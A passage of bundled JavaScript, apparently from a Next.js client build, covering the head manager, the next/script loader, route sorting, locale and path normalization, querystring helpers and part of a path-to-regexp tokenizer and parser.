		    };
		}

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (routeLoader, routeLoader.exports));
	return routeLoader.exports;
}

var script = {exports: {}};

var headManager = {exports: {}};

var hasRequiredHeadManager;

function requireHeadManager () {
	if (hasRequiredHeadManager) return headManager.exports;
	hasRequiredHeadManager = 1;
	(function (module, exports) {
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.default = initHeadManager;
		exports.isEqualNode = isEqualNode;
		exports.DOMAttributeNames = void 0;
		function initHeadManager() {
		    return {
		        mountedInstances: new Set(),
		        updateHead: (head)=>{
		            const tags = {};
		            head.forEach((h)=>{
		                if (// If the font tag is loaded only on client navigation
		                // it won't be inlined. In this case revert to the original behavior
		                h.type === 'link' && h.props['data-optimized-fonts']) {
		                    if (document.querySelector(`style[data-href="${h.props['data-href']}"]`)) {
		                        return;
		                    } else {
		                        h.props.href = h.props['data-href'];
		                        h.props['data-href'] = undefined;
		                    }
		                }
		                const components = tags[h.type] || [];
		                components.push(h);
		                tags[h.type] = components;
		            });
		            const titleComponent = tags.title ? tags.title[0] : null;
		            let title = '';
		            if (titleComponent) {
		                const { children  } = titleComponent.props;
		                title = typeof children === 'string' ? children : Array.isArray(children) ? children.join('') : '';
		            }
		            if (title !== document.title) document.title = title;
		            [
		                'meta',
		                'base',
		                'link',
		                'style',
		                'script'
		            ].forEach((type)=>{
		                updateElements(type, tags[type] || []);
		            });
		        }
		    };
		}
		const DOMAttributeNames = {
		    acceptCharset: 'accept-charset',
		    className: 'class',
		    htmlFor: 'for',
		    httpEquiv: 'http-equiv',
		    noModule: 'noModule'
		};
		exports.DOMAttributeNames = DOMAttributeNames;
		function reactElementToDOM({ type , props  }) {
		    const el = document.createElement(type);
		    for(const p in props){
		        if (!props.hasOwnProperty(p)) continue;
		        if (p === 'children' || p === 'dangerouslySetInnerHTML') continue;
		        // we don't render undefined props to the DOM
		        if (props[p] === undefined) continue;
		        const attr = DOMAttributeNames[p] || p.toLowerCase();
		        if (type === 'script' && (attr === 'async' || attr === 'defer' || attr === 'noModule')) {
		            el[attr] = !!props[p];
		        } else {
		            el.setAttribute(attr, props[p]);
		        }
		    }
		    const { children , dangerouslySetInnerHTML  } = props;
		    if (dangerouslySetInnerHTML) {
		        el.innerHTML = dangerouslySetInnerHTML.__html || '';
		    } else if (children) {
		        el.textContent = typeof children === 'string' ? children : Array.isArray(children) ? children.join('') : '';
		    }
		    return el;
		}
		function isEqualNode(oldTag, newTag) {
		    if (oldTag instanceof HTMLElement && newTag instanceof HTMLElement) {
		        const nonce = newTag.getAttribute('nonce');
		        // Only strip the nonce if `oldTag` has had it stripped. An element's nonce attribute will not
		        // be stripped if there is no content security policy response header that includes a nonce.
		        if (nonce && !oldTag.getAttribute('nonce')) {
		            const cloneTag = newTag.cloneNode(true);
		            cloneTag.setAttribute('nonce', '');
		            cloneTag.nonce = nonce;
		            return nonce === oldTag.nonce && oldTag.isEqualNode(cloneTag);
		        }
		    }
		    return oldTag.isEqualNode(newTag);
		}
		function updateElements(type, components) {
		    const headEl = document.getElementsByTagName('head')[0];
		    const headCountEl = headEl.querySelector('meta[name=next-head-count]');
		    if (process.env.NODE_ENV !== 'production') {
		        if (!headCountEl) {
		            console.error('Warning: next-head-count is missing. https://nextjs.org/docs/messages/next-head-count-missing');
		            return;
		        }
		    }
		    const headCount = Number(headCountEl.content);
		    const oldTags = [];
		    for(let i = 0, j = headCountEl.previousElementSibling; i < headCount; i++, j = (j == null ? void 0 : j.previousElementSibling) || null){
		        var ref;
		        if ((j == null ? void 0 : (ref = j.tagName) == null ? void 0 : ref.toLowerCase()) === type) {
		            oldTags.push(j);
		        }
		    }
		    const newTags = components.map(reactElementToDOM).filter((newTag)=>{
		        for(let k = 0, len = oldTags.length; k < len; k++){
		            const oldTag = oldTags[k];
		            if (isEqualNode(oldTag, newTag)) {
		                oldTags.splice(k, 1);
		                return false;
		            }
		        }
		        return true;
		    });
		    oldTags.forEach((t)=>{
		        var ref;
		        return (ref = t.parentNode) == null ? void 0 : ref.removeChild(t);
		    });
		    newTags.forEach((t)=>headEl.insertBefore(t, headCountEl));
		    headCountEl.content = (headCount - oldTags.length + newTags.length).toString();
		}

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (headManager, headManager.exports));
	return headManager.exports;
}

var hasRequiredScript;

function requireScript () {
	if (hasRequiredScript) return script.exports;
	hasRequiredScript = 1;
	(function (module, exports) {
		"client";
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.handleClientScriptLoad = handleClientScriptLoad;
		exports.initScriptLoader = initScriptLoader;
		exports.default = void 0;
		var _extends = /*@__PURE__*/ require_extends().default;
		var _interop_require_wildcard = /*@__PURE__*/ require_interop_require_wildcard().default;
		var _object_without_properties_loose = /*@__PURE__*/ require_object_without_properties_loose().default;
		var _react = _interop_require_wildcard(React__default);
		var _headManagerContext = requireHeadManagerContext();
		var _headManager = requireHeadManager();
		var _requestIdleCallback = requireRequestIdleCallback();
		const ScriptCache = new Map();
		const LoadCache = new Set();
		const ignoreProps = [
		    'onLoad',
		    'onReady',
		    'dangerouslySetInnerHTML',
		    'children',
		    'onError',
		    'strategy', 
		];
		const loadScript = (props)=>{
		    const { src , id , onLoad =()=>{} , onReady =null , dangerouslySetInnerHTML , children ='' , strategy ='afterInteractive' , onError ,  } = props;
		    const cacheKey = id || src;
		    // Script has already loaded
		    if (cacheKey && LoadCache.has(cacheKey)) {
		        return;
		    }
		    // Contents of this script are already loading/loaded
		    if (ScriptCache.has(src)) {
		        LoadCache.add(cacheKey);
		        // It is possible that multiple `next/script` components all have same "src", but has different "onLoad"
		        // This is to make sure the same remote script will only load once, but "onLoad" are executed in order
		        ScriptCache.get(src).then(onLoad, onError);
		        return;
		    }
		    /** Execute after the script first loaded */ const afterLoad = ()=>{
		        // Run onReady for the first time after load event
		        if (onReady) {
		            onReady();
		        }
		        // add cacheKey to LoadCache when load successfully
		        LoadCache.add(cacheKey);
		    };
		    const el = document.createElement('script');
		    const loadPromise = new Promise((resolve, reject)=>{
		        el.addEventListener('load', function(e) {
		            resolve();
		            if (onLoad) {
		                onLoad.call(this, e);
		            }
		            afterLoad();
		        });
		        el.addEventListener('error', function(e) {
		            reject(e);
		        });
		    }).catch(function(e) {
		        if (onError) {
		            onError(e);
		        }
		    });
		    if (dangerouslySetInnerHTML) {
		        el.innerHTML = dangerouslySetInnerHTML.__html || '';
		        afterLoad();
		    } else if (children) {
		        el.textContent = typeof children === 'string' ? children : Array.isArray(children) ? children.join('') : '';
		        afterLoad();
		    } else if (src) {
		        el.src = src;
		        // do not add cacheKey into LoadCache for remote script here
		        // cacheKey will be added to LoadCache when it is actually loaded (see loadPromise above)
		        ScriptCache.set(src, loadPromise);
		    }
		    for (const [k, value] of Object.entries(props)){
		        if (value === undefined || ignoreProps.includes(k)) {
		            continue;
		        }
		        const attr = _headManager.DOMAttributeNames[k] || k.toLowerCase();
		        el.setAttribute(attr, value);
		    }
		    if (strategy === 'worker') {
		        el.setAttribute('type', 'text/partytown');
		    }
		    el.setAttribute('data-nscript', strategy);
		    document.body.appendChild(el);
		};
		function handleClientScriptLoad(props) {
		    const { strategy ='afterInteractive'  } = props;
		    if (strategy === 'lazyOnload') {
		        window.addEventListener('load', ()=>{
		            (_requestIdleCallback).requestIdleCallback(()=>loadScript(props));
		        });
		    } else {
		        loadScript(props);
		    }
		}
		function loadLazyScript(props) {
		    if (document.readyState === 'complete') {
		        (_requestIdleCallback).requestIdleCallback(()=>loadScript(props));
		    } else {
		        window.addEventListener('load', ()=>{
		            (_requestIdleCallback).requestIdleCallback(()=>loadScript(props));
		        });
		    }
		}
		function addBeforeInteractiveToCache() {
		    const scripts = [
		        ...document.querySelectorAll('[data-nscript="beforeInteractive"]'),
		        ...document.querySelectorAll('[data-nscript="beforePageRender"]'), 
		    ];
		    scripts.forEach((script)=>{
		        const cacheKey = script.id || script.getAttribute('src');
		        LoadCache.add(cacheKey);
		    });
		}
		function initScriptLoader(scriptLoaderItems) {
		    scriptLoaderItems.forEach(handleClientScriptLoad);
		    addBeforeInteractiveToCache();
		}
		function Script(props) {
		    const { id , src ='' , onLoad =()=>{} , onReady =null , strategy ='afterInteractive' , onError  } = props, restProps = _object_without_properties_loose(props, [
		        "id",
		        "src",
		        "onLoad",
		        "onReady",
		        "strategy",
		        "onError"
		    ]);
		    // Context is available only during SSR
		    const { updateScripts , scripts , getIsSsr  } = (_react).useContext(_headManagerContext.HeadManagerContext);
		    /**
		   * - First mount:
		   *   1. The useEffect for onReady executes
		   *   2. hasOnReadyEffectCalled.current is false, but the script hasn't loaded yet (not in LoadCache)
		   *      onReady is skipped, set hasOnReadyEffectCalled.current to true
		   *   3. The useEffect for loadScript executes
		   *   4. hasLoadScriptEffectCalled.current is false, loadScript executes
		   *      Once the script is loaded, the onLoad and onReady will be called by then
		   *   [If strict mode is enabled / is wrapped in <OffScreen /> component]
		   *   5. The useEffect for onReady executes again
		   *   6. hasOnReadyEffectCalled.current is true, so entire effect is skipped
		   *   7. The useEffect for loadScript executes again
		   *   8. hasLoadScriptEffectCalled.current is true, so entire effect is skipped
		   *
		   * - Second mount:
		   *   1. The useEffect for onReady executes
		   *   2. hasOnReadyEffectCalled.current is false, but the script has already loaded (found in LoadCache)
		   *      onReady is called, set hasOnReadyEffectCalled.current to true
		   *   3. The useEffect for loadScript executes
		   *   4. The script is already loaded, loadScript bails out
		   *   [If strict mode is enabled / is wrapped in <OffScreen /> component]
		   *   5. The useEffect for onReady executes again
		   *   6. hasOnReadyEffectCalled.current is true, so entire effect is skipped
		   *   7. The useEffect for loadScript executes again
		   *   8. hasLoadScriptEffectCalled.current is true, so entire effect is skipped
		   */ const hasOnReadyEffectCalled = (_react).useRef(false);
		    (_react).useEffect(()=>{
		        const cacheKey = id || src;
		        if (!hasOnReadyEffectCalled.current) {
		            // Run onReady if script has loaded before but component is re-mounted
		            if (onReady && cacheKey && LoadCache.has(cacheKey)) {
		                onReady();
		            }
		            hasOnReadyEffectCalled.current = true;
		        }
		    }, [
		        onReady,
		        id,
		        src
		    ]);
		    const hasLoadScriptEffectCalled = (_react).useRef(false);
		    (_react).useEffect(()=>{
		        if (!hasLoadScriptEffectCalled.current) {
		            if (strategy === 'afterInteractive') {
		                loadScript(props);
		            } else if (strategy === 'lazyOnload') {
		                loadLazyScript(props);
		            }
		            hasLoadScriptEffectCalled.current = true;
		        }
		    }, [
		        props,
		        strategy
		    ]);
		    if (strategy === 'beforeInteractive' || strategy === 'worker') {
		        if (updateScripts) {
		            scripts[strategy] = (scripts[strategy] || []).concat([
		                _extends({
		                    id,
		                    src,
		                    onLoad,
		                    onReady,
		                    onError
		                }, restProps), 
		            ]);
		            updateScripts(scripts);
		        } else if (getIsSsr && getIsSsr()) {
		            // Script has already loaded during SSR
		            LoadCache.add(id || src);
		        } else if (getIsSsr && !getIsSsr()) {
		            loadScript(props);
		        }
		    }
		    return null;
		}
		Object.defineProperty(Script, '__nextScript', {
		    value: true
		});
		var _default = Script;
		exports.default = _default;

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (script, script.exports));
	return script.exports;
}

var isError = {};

var isPlainObject = {};

var hasRequiredIsPlainObject;

function requireIsPlainObject () {
	if (hasRequiredIsPlainObject) return isPlainObject;
	hasRequiredIsPlainObject = 1;
	Object.defineProperty(isPlainObject, "__esModule", {
	    value: true
	});
	isPlainObject.getObjectClassLabel = getObjectClassLabel;
	isPlainObject.isPlainObject = isPlainObject$1;
	function getObjectClassLabel(value) {
	    return Object.prototype.toString.call(value);
	}
	function isPlainObject$1(value) {
	    if (getObjectClassLabel(value) !== '[object Object]') {
	        return false;
	    }
	    const prototype = Object.getPrototypeOf(value);
	    /**
	   * this used to be previously:
	   *
	   * `return prototype === null || prototype === Object.prototype`
	   *
	   * but Edge Runtime expose Object from vm, being that kind of type-checking wrongly fail.
	   *
	   * It was changed to the current implementation since it's resilient to serialization.
	   */ return prototype === null || prototype.hasOwnProperty('isPrototypeOf');
	}

	
	return isPlainObject;
}

var hasRequiredIsError;

function requireIsError () {
	if (hasRequiredIsError) return isError;
	hasRequiredIsError = 1;
	Object.defineProperty(isError, "__esModule", {
	    value: true
	});
	isError.default = isError$1;
	isError.getProperError = getProperError;
	var _isPlainObject = requireIsPlainObject();
	function isError$1(err) {
	    return typeof err === "object" && err !== null && "name" in err && "message" in err;
	}
	function getProperError(err) {
	    if (isError$1(err)) {
	        return err;
	    }
	    if (process.env.NODE_ENV === "development") {
	        // provide better error for case where `throw undefined`
	        // is called in development
	        if (typeof err === "undefined") {
	            return new Error("An undefined error was thrown, " + "see here for more info: https://nextjs.org/docs/messages/threw-undefined");
	        }
	        if (err === null) {
	            return new Error("A null error was thrown, " + "see here for more info: https://nextjs.org/docs/messages/threw-undefined");
	        }
	    }
	    return new Error((_isPlainObject).isPlainObject(err) ? JSON.stringify(err) : err + "");
	}

	
	return isError;
}

var denormalizePagePath = {};

var utils = {};

var sortedRoutes = {};

var hasRequiredSortedRoutes;

function requireSortedRoutes () {
	if (hasRequiredSortedRoutes) return sortedRoutes;
	hasRequiredSortedRoutes = 1;
	Object.defineProperty(sortedRoutes, "__esModule", {
	    value: true
	});
	sortedRoutes.getSortedRoutes = getSortedRoutes;
	class UrlNode {
	    insert(urlPath) {
	        this._insert(urlPath.split('/').filter(Boolean), [], false);
	    }
	    smoosh() {
	        return this._smoosh();
	    }
	    _smoosh(prefix = '/') {
	        const childrenPaths = [
	            ...this.children.keys()
	        ].sort();
	        if (this.slugName !== null) {
	            childrenPaths.splice(childrenPaths.indexOf('[]'), 1);
	        }
	        if (this.restSlugName !== null) {
	            childrenPaths.splice(childrenPaths.indexOf('[...]'), 1);
	        }
	        if (this.optionalRestSlugName !== null) {
	            childrenPaths.splice(childrenPaths.indexOf('[[...]]'), 1);
	        }
	        const routes = childrenPaths.map((c)=>this.children.get(c)._smoosh(`${prefix}${c}/`)).reduce((prev, curr)=>[
	                ...prev,
	                ...curr
	            ], []);
	        if (this.slugName !== null) {
	            routes.push(...this.children.get('[]')._smoosh(`${prefix}[${this.slugName}]/`));
	        }
	        if (!this.placeholder) {
	            const r = prefix === '/' ? '/' : prefix.slice(0, -1);
	            if (this.optionalRestSlugName != null) {
	                throw new Error(`You cannot define a route with the same specificity as a optional catch-all route ("${r}" and "${r}[[...${this.optionalRestSlugName}]]").`);
	            }
	            routes.unshift(r);
	        }
	        if (this.restSlugName !== null) {
	            routes.push(...this.children.get('[...]')._smoosh(`${prefix}[...${this.restSlugName}]/`));
	        }
	        if (this.optionalRestSlugName !== null) {
	            routes.push(...this.children.get('[[...]]')._smoosh(`${prefix}[[...${this.optionalRestSlugName}]]/`));
	        }
	        return routes;
	    }
	    _insert(urlPaths, slugNames, isCatchAll) {
	        if (urlPaths.length === 0) {
	            this.placeholder = false;
	            return;
	        }
	        if (isCatchAll) {
	            throw new Error(`Catch-all must be the last part of the URL.`);
	        }
	        // The next segment in the urlPaths list
	        let nextSegment = urlPaths[0];
	        // Check if the segment matches `[something]`
	        if (nextSegment.startsWith('[') && nextSegment.endsWith(']')) {
	            // Strip `[` and `]`, leaving only `something`
	            let segmentName = nextSegment.slice(1, -1);
	            let isOptional = false;
	            if (segmentName.startsWith('[') && segmentName.endsWith(']')) {
	                // Strip optional `[` and `]`, leaving only `something`
	                segmentName = segmentName.slice(1, -1);
	                isOptional = true;
	            }
	            if (segmentName.startsWith('...')) {
	                // Strip `...`, leaving only `something`
	                segmentName = segmentName.substring(3);
	                isCatchAll = true;
	            }
	            if (segmentName.startsWith('[') || segmentName.endsWith(']')) {
	                throw new Error(`Segment names may not start or end with extra brackets ('${segmentName}').`);
	            }
	            if (segmentName.startsWith('.')) {
	                throw new Error(`Segment names may not start with erroneous periods ('${segmentName}').`);
	            }
	            function handleSlug(previousSlug, nextSlug) {
	                if (previousSlug !== null) {
	                    // If the specific segment already has a slug but the slug is not `something`
	                    // This prevents collisions like:
	                    // pages/[post]/index.js
	                    // pages/[id]/index.js
	                    // Because currently multiple dynamic params on the same segment level are not supported
	                    if (previousSlug !== nextSlug) {
	                        // TODO: This error seems to be confusing for users, needs an error link, the description can be based on above comment.
	                        throw new Error(`You cannot use different slug names for the same dynamic path ('${previousSlug}' !== '${nextSlug}').`);
	                    }
	                }
	                slugNames.forEach((slug)=>{
	                    if (slug === nextSlug) {
	                        throw new Error(`You cannot have the same slug name "${nextSlug}" repeat within a single dynamic path`);
	                    }
	                    if (slug.replace(/\W/g, '') === nextSegment.replace(/\W/g, '')) {
	                        throw new Error(`You cannot have the slug names "${slug}" and "${nextSlug}" differ only by non-word symbols within a single dynamic path`);
	                    }
	                });
	                slugNames.push(nextSlug);
	            }
	            if (isCatchAll) {
	                if (isOptional) {
	                    if (this.restSlugName != null) {
	                        throw new Error(`You cannot use both an required and optional catch-all route at the same level ("[...${this.restSlugName}]" and "${urlPaths[0]}" ).`);
	                    }
	                    handleSlug(this.optionalRestSlugName, segmentName);
	                    // slugName is kept as it can only be one particular slugName
	                    this.optionalRestSlugName = segmentName;
	                    // nextSegment is overwritten to [[...]] so that it can later be sorted specifically
	                    nextSegment = '[[...]]';
	                } else {
	                    if (this.optionalRestSlugName != null) {
	                        throw new Error(`You cannot use both an optional and required catch-all route at the same level ("[[...${this.optionalRestSlugName}]]" and "${urlPaths[0]}").`);
	                    }
	                    handleSlug(this.restSlugName, segmentName);
	                    // slugName is kept as it can only be one particular slugName
	                    this.restSlugName = segmentName;
	                    // nextSegment is overwritten to [...] so that it can later be sorted specifically
	                    nextSegment = '[...]';
	                }
	            } else {
	                if (isOptional) {
	                    throw new Error(`Optional route parameters are not yet supported ("${urlPaths[0]}").`);
	                }
	                handleSlug(this.slugName, segmentName);
	                // slugName is kept as it can only be one particular slugName
	                this.slugName = segmentName;
	                // nextSegment is overwritten to [] so that it can later be sorted specifically
	                nextSegment = '[]';
	            }
	        }
	        // If this UrlNode doesn't have the nextSegment yet we create a new child UrlNode
	        if (!this.children.has(nextSegment)) {
	            this.children.set(nextSegment, new UrlNode());
	        }
	        this.children.get(nextSegment)._insert(urlPaths.slice(1), slugNames, isCatchAll);
	    }
	    constructor(){
	        this.placeholder = true;
	        this.children = new Map();
	        this.slugName = null;
	        this.restSlugName = null;
	        this.optionalRestSlugName = null;
	    }
	}
	function getSortedRoutes(normalizedPages) {
	    // First the UrlNode is created, and every UrlNode can have only 1 dynamic segment
	    // Eg you can't have pages/[post]/abc.js and pages/[hello]/something-else.js
	    // Only 1 dynamic segment per nesting level
	    // So in the case that is test/integration/dynamic-routing it'll be this:
	    // pages/[post]/comments.js
	    // pages/blog/[post]/comment/[id].js
	    // Both are fine because `pages/[post]` and `pages/blog` are on the same level
	    // So in this case `UrlNode` created here has `this.slugName === 'post'`
	    // And since your PR passed through `slugName` as an array basically it'd including it in too many possibilities
	    // Instead what has to be passed through is the upwards path's dynamic names
	    const root = new UrlNode();
	    // Here the `root` gets injected multiple paths, and insert will break them up into sublevels
	    normalizedPages.forEach((pagePath)=>root.insert(pagePath));
	    // Smoosh will then sort those sublevels up to the point where you get the correct route definition priority
	    return root.smoosh();
	}

	
	return sortedRoutes;
}

var isDynamic = {};

var hasRequiredIsDynamic;

function requireIsDynamic () {
	if (hasRequiredIsDynamic) return isDynamic;
	hasRequiredIsDynamic = 1;
	Object.defineProperty(isDynamic, "__esModule", {
	    value: true
	});
	isDynamic.isDynamicRoute = isDynamicRoute;
	// Identify /[param]/ in route string
	const TEST_ROUTE = /\/\[[^/]+?\](?=\/|$)/;
	function isDynamicRoute(route) {
	    return TEST_ROUTE.test(route);
	}

	
	return isDynamic;
}

var hasRequiredUtils;

function requireUtils () {
	if (hasRequiredUtils) return utils;
	hasRequiredUtils = 1;
	(function (exports) {
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		Object.defineProperty(exports, "getSortedRoutes", {
		    enumerable: true,
		    get: function() {
		        return _sortedRoutes.getSortedRoutes;
		    }
		});
		Object.defineProperty(exports, "isDynamicRoute", {
		    enumerable: true,
		    get: function() {
		        return _isDynamic.isDynamicRoute;
		    }
		});
		var _sortedRoutes = requireSortedRoutes();
		var _isDynamic = requireIsDynamic();

		
	} (utils));
	return utils;
}

var normalizePathSep = {};

var hasRequiredNormalizePathSep;

function requireNormalizePathSep () {
	if (hasRequiredNormalizePathSep) return normalizePathSep;
	hasRequiredNormalizePathSep = 1;
	Object.defineProperty(normalizePathSep, "__esModule", {
	    value: true
	});
	normalizePathSep.normalizePathSep = normalizePathSep$1;
	function normalizePathSep$1(path) {
	    return path.replace(/\\/g, '/');
	}

	
	return normalizePathSep;
}

var hasRequiredDenormalizePagePath;

function requireDenormalizePagePath () {
	if (hasRequiredDenormalizePagePath) return denormalizePagePath;
	hasRequiredDenormalizePagePath = 1;
	Object.defineProperty(denormalizePagePath, "__esModule", {
	    value: true
	});
	denormalizePagePath.denormalizePagePath = denormalizePagePath$1;
	var _utils = requireUtils();
	var _normalizePathSep = requireNormalizePathSep();
	function denormalizePagePath$1(page) {
	    let _page = (_normalizePathSep).normalizePathSep(page);
	    return _page.startsWith('/index/') && !(_utils).isDynamicRoute(_page) ? _page.slice(6) : _page !== '/index' ? _page : '/';
	}

	
	return denormalizePagePath;
}

var normalizeLocalePath$1 = {};

var hasRequiredNormalizeLocalePath$1;

function requireNormalizeLocalePath$1 () {
	if (hasRequiredNormalizeLocalePath$1) return normalizeLocalePath$1;
	hasRequiredNormalizeLocalePath$1 = 1;
	Object.defineProperty(normalizeLocalePath$1, "__esModule", {
	    value: true
	});
	normalizeLocalePath$1.normalizeLocalePath = normalizeLocalePath;
	function normalizeLocalePath(pathname, locales) {
	    let detectedLocale;
	    // first item will be empty string from splitting at first char
	    const pathnameParts = pathname.split('/');
	    (locales || []).some((locale)=>{
	        if (pathnameParts[1] && pathnameParts[1].toLowerCase() === locale.toLowerCase()) {
	            detectedLocale = locale;
	            pathnameParts.splice(1, 1);
	            pathname = pathnameParts.join('/') || '/';
	            return true;
	        }
	        return false;
	    });
	    return {
	        pathname,
	        detectedLocale
	    };
	}

	
	return normalizeLocalePath$1;
}

var mitt = {};

var hasRequiredMitt;

function requireMitt () {
	if (hasRequiredMitt) return mitt;
	hasRequiredMitt = 1;
	Object.defineProperty(mitt, "__esModule", {
	    value: true
	});
	mitt.default = mitt$1;
	function mitt$1() {
	    const all = Object.create(null);
	    return {
	        on (type, handler) {
	            (all[type] || (all[type] = [])).push(handler);
	        },
	        off (type, handler) {
	            if (all[type]) {
	                all[type].splice(all[type].indexOf(handler) >>> 0, 1);
	            }
	        },
	        emit (type, ...evts) {
	            (all[type] || []).slice().map((handler)=>{
	                handler(...evts);
	            });
	        }
	    };
	}

	
	return mitt;
}

var parseRelativeUrl = {};

var querystring = {};

var hasRequiredQuerystring;

function requireQuerystring () {
	if (hasRequiredQuerystring) return querystring;
	hasRequiredQuerystring = 1;
	Object.defineProperty(querystring, "__esModule", {
	    value: true
	});
	querystring.searchParamsToUrlQuery = searchParamsToUrlQuery;
	querystring.urlQueryToSearchParams = urlQueryToSearchParams;
	querystring.assign = assign;
	function searchParamsToUrlQuery(searchParams) {
	    const query = {};
	    searchParams.forEach((value, key)=>{
	        if (typeof query[key] === 'undefined') {
	            query[key] = value;
	        } else if (Array.isArray(query[key])) {
	            query[key].push(value);
	        } else {
	            query[key] = [
	                query[key],
	                value
	            ];
	        }
	    });
	    return query;
	}
	function stringifyUrlQueryParam(param) {
	    if (typeof param === 'string' || typeof param === 'number' && !isNaN(param) || typeof param === 'boolean') {
	        return String(param);
	    } else {
	        return '';
	    }
	}
	function urlQueryToSearchParams(urlQuery) {
	    const result = new URLSearchParams();
	    Object.entries(urlQuery).forEach(([key, value])=>{
	        if (Array.isArray(value)) {
	            value.forEach((item)=>result.append(key, stringifyUrlQueryParam(item)));
	        } else {
	            result.set(key, stringifyUrlQueryParam(value));
	        }
	    });
	    return result;
	}
	function assign(target, ...searchParamsList) {
	    searchParamsList.forEach((searchParams)=>{
	        Array.from(searchParams.keys()).forEach((key)=>target.delete(key));
	        searchParams.forEach((value, key)=>target.append(key, value));
	    });
	    return target;
	}

	
	return querystring;
}

var hasRequiredParseRelativeUrl;

function requireParseRelativeUrl () {
	if (hasRequiredParseRelativeUrl) return parseRelativeUrl;
	hasRequiredParseRelativeUrl = 1;
	Object.defineProperty(parseRelativeUrl, "__esModule", {
	    value: true
	});
	parseRelativeUrl.parseRelativeUrl = parseRelativeUrl$1;
	var _utils = requireUtils$1();
	var _querystring = requireQuerystring();
	function parseRelativeUrl$1(url, base) {
	    const globalBase = new URL(typeof window === 'undefined' ? 'http://n' : (_utils).getLocationOrigin());
	    const resolvedBase = base ? new URL(base, globalBase) : url.startsWith('.') ? new URL(typeof window === 'undefined' ? 'http://n' : window.location.href) : globalBase;
	    const { pathname , searchParams , search , hash , href , origin  } = new URL(url, resolvedBase);
	    if (origin !== globalBase.origin) {
	        throw new Error(`invariant: invalid relative URL, router received ${url}`);
	    }
	    return {
	        pathname,
	        query: (_querystring).searchParamsToUrlQuery(searchParams),
	        search,
	        hash,
	        href: href.slice(globalBase.origin.length)
	    };
	}

	
	return parseRelativeUrl;
}

var resolveRewrites = {};

var pathMatch = {};

var pathToRegexp = {};

var hasRequiredPathToRegexp;

function requirePathToRegexp () {
	if (hasRequiredPathToRegexp) return pathToRegexp;
	hasRequiredPathToRegexp = 1;
	Object.defineProperty(pathToRegexp, "__esModule", { value: true });
	/**
	 * Tokenize input string.
	 */
	function lexer(str) {
	    var tokens = [];
	    var i = 0;
	    while (i < str.length) {
	        var char = str[i];
	        if (char === "*" || char === "+" || char === "?") {
	            tokens.push({ type: "MODIFIER", index: i, value: str[i++] });
	            continue;
	        }
	        if (char === "\\") {
	            tokens.push({ type: "ESCAPED_CHAR", index: i++, value: str[i++] });
	            continue;
	        }
	        if (char === "{") {
	            tokens.push({ type: "OPEN", index: i, value: str[i++] });
	            continue;
	        }
	        if (char === "}") {
	            tokens.push({ type: "CLOSE", index: i, value: str[i++] });
	            continue;
	        }
	        if (char === ":") {
	            var name = "";
	            var j = i + 1;
	            while (j < str.length) {
	                var code = str.charCodeAt(j);
	                if (
	                // `0-9`
	                (code >= 48 && code <= 57) ||
	                    // `A-Z`
	                    (code >= 65 && code <= 90) ||
	                    // `a-z`
	                    (code >= 97 && code <= 122) ||
	                    // `_`
	                    code === 95) {
	                    name += str[j++];
	                    continue;
	                }
	                break;
	            }
	            if (!name)
	                throw new TypeError("Missing parameter name at " + i);
	            tokens.push({ type: "NAME", index: i, value: name });
	            i = j;
	            continue;
	        }
	        if (char === "(") {
	            var count = 1;
	            var pattern = "";
	            var j = i + 1;
	            if (str[j] === "?") {
	                throw new TypeError("Pattern cannot start with \"?\" at " + j);
	            }
	            while (j < str.length) {
	                if (str[j] === "\\") {
	                    pattern += str[j++] + str[j++];
	                    continue;
	                }
	                if (str[j] === ")") {
	                    count--;
	                    if (count === 0) {
	                        j++;
	                        break;
	                    }
	                }
	                else if (str[j] === "(") {
	                    count++;
	                    if (str[j + 1] !== "?") {
	                        throw new TypeError("Capturing groups are not allowed at " + j);
	                    }
	                }
	                pattern += str[j++];
	            }
	            if (count)
	                throw new TypeError("Unbalanced pattern at " + i);
	            if (!pattern)
	                throw new TypeError("Missing pattern at " + i);
	            tokens.push({ type: "PATTERN", index: i, value: pattern });
	            i = j;
	            continue;
	        }
	        tokens.push({ type: "CHAR", index: i, value: str[i++] });
	    }
	    tokens.push({ type: "END", index: i, value: "" });
	    return tokens;
	}
	/**
	 * Parse a string for the raw tokens.
	 */
	function parse(str, options) {
	    if (options === void 0) { options = {}; }
	    var tokens = lexer(str);
	    var _a = options.prefixes, prefixes = _a === void 0 ? "./" : _a;
	    var defaultPattern = "[^" + escapeString(options.delimiter || "/#?") + "]+?";
	    var result = [];
	    var key = 0;
	    var i = 0;
	    var path = "";
	    var tryConsume = function (type) {
	        if (i < tokens.length && tokens[i].type === type)
	            return tokens[i++].value;
	    };
	    var mustConsume = function (type) {
	        var value = tryConsume(type);
	        if (value !== undefined)
	            return value;
	        var _a = tokens[i], nextType = _a.type, index = _a.index;
	        throw new TypeError("Unexpected " + nextType + " at " + index + ", expected " + type);
	    };
	    var consumeText = function () {
	        var result = "";
	        var value;
	        // tslint:disable-next-line
	        while ((value = tryConsume("CHAR") || tryConsume("ESCAPED_CHAR"))) {
	            result += value;
	        }
	        return result;
	    };
	    while (i < tokens.length) {
	        var char = tryConsume("CHAR");
	        var name = tryConsume("NAME");
	        var pattern = tryConsume("PATTERN");
	        if (name || pattern) {
	            var prefix = char || "";
	            if (prefixes.indexOf(prefix) === -1) {
	                path += prefix;
	                prefix = "";
	            }
	            if (path) {
	                result.push(path);
	                path = "";
	            }
	            result.push({
	                name: name || key++,
	                prefix: prefix,
	                suffix: "",
	                pattern: pattern || defaultPattern,
	                modifier: tryConsume("MODIFIER") || ""
	            });
	            continue;
	        }
	        var value = char || tryConsume("ESCAPED_CHAR");
	        if (value) {
	            path += value;
	            continue;
	        }
	        if (path) {
	            result.push(path);
	            path = "";
	        }
